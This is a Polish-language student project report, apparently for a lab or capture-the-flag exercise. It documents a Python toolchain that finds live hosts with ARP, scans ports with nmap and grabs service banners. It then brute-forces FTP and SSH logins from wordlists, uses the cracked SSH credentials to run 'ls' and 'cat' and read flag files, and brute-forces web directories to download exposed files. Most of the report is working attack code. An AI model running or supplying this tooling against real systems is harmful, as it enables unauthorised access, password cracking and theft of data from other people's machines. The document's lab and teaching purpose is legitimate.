Projekt 1 – Linux + Python
Poszczególne funkcje realizowane są przez osobne funkcje umieszczone w osobnych plikach.
Dodatkowe pakiety python wyszczególnione są w pliku requirements.txt

Pkt. 1. realizowany jest łącznie z pkt. 2. za pomocą funkcji: get_local_ip_param()
Ustalanie adresu i maski odbywa się z wykorzystaniem pakietu ifcfg
Funkcja zwraca różne parametry interfejsu sieciowego, w zależności od podanych argumentów. W naszym przypadku jest to adres IP i maska.
Plik getParameters.py

def get_local_ip_param(ifname: str, inet=True, inet4=False, ether=False, inet6=False, netmask=False, 
	netmasks=False, broadcast=False, broadcasts=False, prefixlens=False, device=False,flags = False, mtu=False ):
	"""Gets specific ip parameters of specific network device

	Args:
		ifname (str): interface name
		inet (bool, optional): ip address. Defaults to True.
		inet4 (bool, optional): ip4 address as list. Defaults to False.
		ether (bool, optional): ethernet address. Defaults to False.
		inet6 (bool, optional): ip6 address as list. Defaults to False.
		netmask (bool, optional): netmask. Defaults to False.
		netmasks (bool, optional): netmask as list. Defaults to False.
		broadcast (bool, optional): broadcast address. Defaults to False.
		broadcasts (bool, optional): broadcast address as list. Defaults to False.
		prefixlens (bool, optional): prefixlen. Defaults to False.
		device (bool, optional): device name. Defaults to False.
		flags (bool, optional): interface status. Defaults to False.
		mtu (bool, optional): mtu value. Defaults to False.

	Returns:
		list: list of network parameters if value = True
	"""
	parameters = []
	for name, interface in ifcfg.interfaces().items():
		if name == ifname:
			for key, value in interface.items():
				if inet and key == 'inet':
					parameters.append(value)
				elif inet4 and key == 'inet4':
					parameters.append(value)
				elif ether and key == 'ether':
					parameters.append(value)
				elif inet6 and key == 'inet6': 
					parameters.append(value)
				elif netmask and key == 'netmask':
					parameters.append(value)
				elif netmasks and key == 'netmasks':
					parameters.append(value)
				elif broadcast and key == 'broadcast':
					parameters.append(value)
				elif broadcasts and key == 'broadcasts':
					parameters.append(value)
				elif prefixlens and key == 'prefixlens':
					parameters.append(value)
				elif device and key == 'device':
					parameters.append(value)
				elif flags and key == 'flags':
					parameters.append(value)
				elif mtu and key == 'mtu':
					parameters.append(value)
				else:
					pass
		else:
			pass			
	return parameters 

Pkt. 3. Aktywne hosty uzyskujemy jako rezultat wykonania funkcji hosts_alive_list(ip_param: list)
Jako argumenty wejściowe podajemy adres ip oraz maskę. Aktywne hosty wykrywamy za pomocą protokołu APR. Wykorzystujemy moduł scapy tworząc pakiet ether/arp i wiadomość srp. Funkcja zwraca listę aktywnych hostów.

Plik hosts2scan.py

https://www.thepythoncode.com/article/building-network-scanner-using-scapy

def hosts_alive_list(ip_param: list):
    """Gets parameteres of host network device and calculate list of alive hosts in local network

    Args:
        ip_param (list): Expected: [ip_addr, netmask]

    Returns:
        list: list of alive hosts
    """
    from scapy.all import ARP, Ether, srp
    from netaddr import IPAddress
    target_ip = ip_param[0]+'/'+ str(IPAddress(ip_param[1]).netmask_bits()) # convert mask into bits
    # create ARP packet
    arp = ARP(pdst=target_ip)
    # create the Ether broadcast packet - ff:ff:ff:ff:ff:ff MAC address indicates broadcasting
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    
    packet = ether/arp # stack them
    result = srp(packet, timeout=3, verbose=0)[0]

    # a list of clients, we will fill this in the upcoming loop
    clients = []

    for sent, received in result:
        # for each response, append ip address to `clients` list
        live_received = received.psrc
        if live_received != ip_param[0]: # remove local ip address
            clients.append(live_received)

    return clients

Pkt. 4. Aktywne hosty skanujemy pod kątem otwartych portów w pętlach po adresach ip, oraz po zakresie portów wywołując obiekt klasy nmap.PortScanner().  Ograniczyliśmy skanowanie portów do zakresu 21-80. Funkcja drukuje na ekranie kolejne porty i ich status. Argument wejściowy to lista aktywnych hostów, zwraca słownik, gdzie kluczem jest adres ip, wartością jest lista otwartych portów. Funkcja scan_hosts().

Plik scanned.py

import nmap

def scan_hosts(ips: list) -> dict:
    """Gets the list of ip to scan, returns list of opened ports assign to specific ip address
    Uses nmap (need to be imported), method PortScaner().
    Run as root

    Args:
        ips (list): list of ip to scan

    Returns:
        dict: key: ip, value: list of opened ports
    """
    START_PORT = 21
    END_PORT = 80
    print("Scanning...")
    scanner = nmap.PortScanner()
    hosts_open_ports = {}
    for ip in ips:
        address = str(ip)
        ports_open = []
        for port in range (START_PORT, END_PORT + 1):
            resp = scanner.scan(address, str(port))
            resp = resp['scan'][address]['tcp'][port]['state']
            if resp == "open":
                print(f'Host {address} port {port} is {resp}.')
                ports_open.append(port)
            else:   #prints out closed ports
                print(f'Host {address} port {port} is {resp}.')
        hosts_open_ports[address] = ports_open
    return hosts_open_ports

Pkt. 5. Funkcja get_banner() pobiera słownik(), łączy się na poszczególne porty wysyła proste zapytanie i odczytuje odpowiedz. Dla portów 21,22 jest to prosta informacja o oprogramowaniu, dla portu 80, odpowiedz serwera http, z której wyciągamy sekcję Server: Logika funkcji opiera się na module socket.

Plik bannerGrabbing.py

import socket

def get_banner(addresses_ports: dict) -> None:
    """Function trying to discover software for opened ports and print it out

    Args:
        addresses_ports (dict): key: ip, value: list of opened ports
    """

    for addr_ip, ports_list in addresses_ports.items():
        if len(ports_list) == 0:
            print("Host: {addr_ip} no ports opened")
            continue
        for port in ports_list:
            print(port)
            try:
                fd = socket.socket() # create socket
                fd.connect((addr_ip, int(port))) #connect to ip/port
                fd.settimeout(2)
                query = "GET / HTTP/1.1\nHost: " + addr_ip + "\n\n" # making query
                fd.send(query.encode()) # send query to server 
                receive = fd.recv(2048).decode() # receive 2048 bytes
                if port == 80:    #if port 80 / http - parsing the answer
                    lines = receive.splitlines()
                    for line in lines:
                        if line.startswith("Server:"):
                            receive = line
              
                print(f"Host: {addr_ip} port: {port} software: {receive}")
            
            except socket.error:
                print(f"Host: {addr_ip} port: {port}")
                print("Socket error", socket.error) # exception in case port is close
            finally:
                fd.close()

Pkt. 6. W ostatniej części zautomatyzowaliśmy proces przeprowadzenia ataku brute force na porty 21 – FTP, SSH – 22 oraz HTTP - 80. Funkcja brute_force() wykorzystuje trzy podfunkcje wywoływane w zależności od atakowanego portu. Dla FTP – brute_force_FTP() wykorzystuje moduł ftplib, dla SSH – brute_force_SSH() – moduł paramiko.
Efekt działania wyświetlany jest na bieżąco, oraz zapisywany w słowniku odpowiednio FTP_credentials oraz SSH_credentials do wykorzystania w kolejnych krokach, lub do zapisania do pliku.
Dla HTTP - wykorzystywane są moduły requests oraz BeautifulSoup. Próba listingu usługi http jest wywoływana funkcją atack.print_list(adres) utworzoną w klasie AttackHttp w oddzielnym pliku. 

Plik bruteForce.py

import paramiko
import ftplib
import time
import socket
import sys, os
from atack_http import AtackHttp


def brute_force_FTP(targetIP: str) -> None:
    """Gets ip address and tries to login to FTP server 
    users and passwords from file
    uses module ftplib.FTP()

    Args:
        targetIP (str): ip address
    Returns: FTP_cerdentials (dict) : key: targetIP, value: list of lists; each list consists of pair user and password
    """
    print(f"Calling brute_force_FTP on {targetIP}")

    # files: users and passwords operations
    
    password_file = "passwd.txt"
    users_file = "users.txt"
    users = open(users_file)
    passwds = open(password_file)
    users_list = users.read().split("\n")
    pass_list = passwds.read().split("\n")
    users.close()
    passwds.close()

    ftpServer = ftplib.FTP()
    FTP_credentials = {}
    user_pass = []

    for user in users_list:
        user = user.strip()
        for passwd in pass_list:
            passwd = passwd.strip()
            try:
                print(f"Trying: {user}: {passwd}")
                ftpServer.connect(targetIP, 21, timeout=1000)
                ftpServer.login(user, passwd)
                print(f"[+] Found combo for FTP:\n\tHOSTNAME: {targetIP}\n\tUSERNAME: {user}\n\tPASSWORD: {passwd}")
                user_pass.append([user, passwd])
                FTP_credentials[targetIP] = user_pass
                ftpServer.close()
                break
            except Exception as error:
                print(f"[!] {error}")
    return FTP_credentials

def brute_force_SSH(targetIP: str) -> dict:
    """Gets ip address and tries to login to SSH server 
    users and passwords from file
    uses module paramiko.SSHClient()

    Args:
        targetIP (str): ip address
    
    Returns: SSH_cerdentials (dict) : key: targetIP, value: list of lists; each list consists of pair user and password
    """
    print(f"Calling: brute_force_SSH on {targetIP}")

    # files: users and passwords operations

    password_file = "passwd.txt"
    users_file = "users.txt"
    users = open(users_file)
    passwds = open(password_file)
    users_list = users.read().split("\n")
    pass_list = passwds.read().split("\n")
    users.close()
    passwds.close()

    # initialize SSH client
    SSH_credentials = {}
    user_pass = []

    for user in users_list:
        user = user.strip()
        for passwd in pass_list:
            passwd = passwd.strip()
            try:
                sshserver = paramiko.SSHClient()
                # add to know hosts
                sshserver.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                sshserver.load_system_host_keys()
                sshserver.connect(hostname=targetIP, username=user, password=passwd, timeout=3)
                tr = sshserver.get_transport()
                tr.banner_timeout = 3000
                tr.set_keepalive(3)
                tr.close()
                #tr.stop_thread()
                sshserver.close()
            except socket.timeout:
                pass
                # this is when host is unreachable
                #print(f"[!] Host: {targetIP} is unreachable, timed out.")
            except paramiko.AuthenticationException:
                pass
                #print(f"[!] Invalid credentials for {user}:{passwd}")
            except paramiko.SSHException:
                pass
                #print(f"[*] Quota exceeded, retrying with delay...")
                # sleep for a minute
                time.sleep(3)
            else:
                # connection was established successfully
                #print(f"[+] Found combo for SSH:\n\tHOSTNAME: {targetIP}\n\tUSERNAME: {user}\n\tPASSWORD: {passwd}")
                user_pass.append([user, passwd])
                sshserver.close()
                break


    SSH_credentials[targetIP] = user_pass
    return SSH_credentials # this dict can be used in another function to log in and manipulate on remote system


def read_file(slownik: dict, target_ip):
    autenticated = False
    #slownik = brute_force_SSH(target_ip)
    sshserver = paramiko.SSHClient()
    sshserver.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    sshserver.load_system_host_keys()
    for ip_adr, user_list in slownik.items():
        for user in user_list:
            try:
                sshserver = paramiko.SSHClient()
                # add to know hosts
                sshserver.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                sshserver.load_system_host_keys()
                sshserver.connect(hostname=target_ip, username=user[0], password=user[1], timeout=3)
                autenticated = True
            except socket.timeout:
                pass
                # this is when host is unreachable
                #print(f"[!] Host: {targetIP} is unreachable, timed out.")
            except paramiko.AuthenticationException:
                pass
                #print(f"[!] Invalid credentials for {user}:{passwd}")
            except paramiko.SSHException:
                pass
                #print(f"[*] Quota exceeded, retrying with delay...")
                # sleep for a minute
                time.sleep(3)
            else:
                command = "ls -a"
                stdin, stdout, stderr = sshserver.exec_command(command)
                lista = stdout.readlines()
                print(f"List of {user[0]} files:")
                for list in lista:
                    print(f"{list.strip()}")
                    plik = list.find(".txt")
                    if plik != -1:
                        polecenie = "cat " + list.strip()
                        stdin, stdout, stderr = sshserver.exec_command(polecenie)
                        print(stderr.read())
                        flaga = stdout.readlines()[0]
                        print(f"Flaga z pliku {list.strip()} to: {flaga} ")
                        tr = sshserver.get_transport()
                        tr.banner_timeout = 3000
                        tr.close()
                        tr.stop_thread()
                        sshserver.close()
                        autenticated = False
                        break

def brute_force(hosts_ports_list: dict):
    for ip_addr, ports in hosts_ports_list.items():
        for port in ports:
            #if port == 21:
            #    print(brute_force_FTP(ip_addr))
            #if port == 22:
            #    slownik = brute_force_SSH(ip_addr)
            #    print(slownik)
                #print(brute_force_SSH(ip_addr))
            #    read_file(slownik, ip_addr)
            if port == 80:
                adres = "http://"+ip_addr
                atack = AtackHttp()
                atack.print_list(adres)



# param = {'192.168.10.100': (21,22,80)}
# ip = '192.168.10.100'
# # brute_force_FTP(ip)
# # brute_force_SSH(ip)
# brute_force(param)
# # print_list("192.168.10.100")

Klasa AtackHttp powstała by móc przeczytać zawartość katalogu strony internetowej.
Klasa posiada cztery atrybuty:__list_200, __list_403, __link_list oraz __adres, które będziemy wykorzystywać do dalszych czynności. 
Funkcja print_list jest główną funkcją, która uruchamia poszczególne metody wewnątrz klasy.
Funkcja make_list pobiera jako parametr wejściowy adres strony internetowej i na podstawie słownika tworzy listę wszystkich możliwych linków do sprawdzenia i wpisuje do zmiennej __link_list. Następna metoda check_list wywołuje metodę check_http, która korzysta ze zmiennej __link_list i sprawdza, czy takie linki na serwerze istnieją. Jeżeli istnieją to zwracany jest status nr 200, jeżeli jest jakiś katalog i nie jest on dostępy wtedy zwracany jest kod 403 i takie przypadki linków są zapisywane odpowiednio do zmiennych __link_200 i __link_403. W innym przypadku adres jest usuwany z listy linków. 
Po sprawdzeniu linków wywoływana jest kolejny raz metoda make_list aby utworzyć możliwe linki biorąc pod uwagę linki, które znajdują się w liście __link200 i __link_403. Następnie wszystkie linki są wyświetlane. Kolejną metodą wywoływaną jest get_files(), która zapisuje wszystkie pliki znajdujące się na serwerze, do których mamy dostep. Funkcja ta wywołuje funkcję get_file, która jako parametry przyjmuje adres strony oraz listę plików do zapisania. Tworzymy nazwę katalogu, gdzie zostaną zapisane pliki> Nazwa jest tworzona poprzez rozbicie adresu pliku i odcięcie trzech pierwszych elementów listy. Następnie usuwamy katalog o danej nazwie, a następnie tworzymy od nowa taki katalog i do tego katalogu zapisujemy wszystkie pliki znajdujące się w danej lokalizacji. 
Lista plików jest tworzona metodą get_page, która jako parametr przyjmuje adres strony. W tej funkcji dostajemy źródło strony metodą requests.get().text. Następnie z tego źródła otrzymujemy obiekt z biblioteki BeautifulSoup, który później sprawdzamy pod kątem wystąpienia w znaczniku "title" ciągu znaków "Index of" a jeżeli taki ciąg znaków występuje to zapisujemy do listy występowania linków do plików czyli znaczników "a href" języka html.

plik atack_http.py

import shutil
import requests
from bs4 import BeautifulSoup
import os

##with open("/usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt", errors='ignore') as f:
class AtackHttp:
    __list_200 = []
    __list_403 = []
    __link_list = []
    __adres = ''

    def __init__(self):
        __list_200 = []
        __list_403 = []
        __link_list = []
        __adres = ''

    def check_http(self):
        for url in self.__link_list:
            response = requests.get(url)
            if response.status_code == 200:
                if url not in self.__list_200:
                    self.__list_200.append(url)
            elif response.status_code == 403:
                if url not in self.__list_403:
                    self.__list_403.append(url)
            else:
                self.__link_list.remove(url)

    def make_list(self, targetIP):
        with open("slownik.txt", errors='ignore') as f:
            dictionary = f.read().split("\n")
            for entry in dictionary:
                if entry.startswith("#"):
                    url_to_check = targetIP + "/"
                elif entry.startswith("?"):
                    url_to_check = targetIP + "/"
                else:
                    if targetIP.endswith("/"):
                        url_to_check = targetIP + entry
                    else:
                        url_to_check = targetIP + "/" + entry
                self.__link_list.append(url_to_check)


    def check_list(self):
        self.check_http()
        for link in self.__list_200:
            self.make_list(link)
            #print(self.make_list(link))
            self.check_http()

    #glowna funkcja
    def print_list(self, adres):
        self.make_list(adres)
        self.check_list()
        print(f"Lista linkw dozwolonych to: {self.__list_200}")
        #print(self.get_page("http://192.168.0.176/libs"))
        self.get_files()

    def get_page(self, url):
        links = []
        response = requests.get(url).text
        soup = BeautifulSoup(response, "html.parser")
        title = str(soup.findAll("title"))
        if 'Index of' in str(title):
            for res in soup.findAll("a", {'href': True}):
                file = res.get('href')
                if file[-1] != "/" and file[0] != "?":
                    links.append(file)
            return links
        else:
            return []

    def get_file(self, url, file_list):
        nazwa_folderu = "-".join(url.split("/")[3:])
        print(nazwa_folderu)
        if nazwa_folderu != '':
            shutil.rmtree(nazwa_folderu, ignore_errors=True)
            os.mkdir(nazwa_folderu)
        else:
            shutil.rmtree("root", ignore_errors=True)
            os.mkdir("root")
        for file in file_list:
            response = requests.get(url+"/"+file)
            open(nazwa_folderu+"/"+file, "wb").write(response.content)

    def get_files(self):
        for url in self.__list_200:
            self.get_file(url, self.get_page(url))
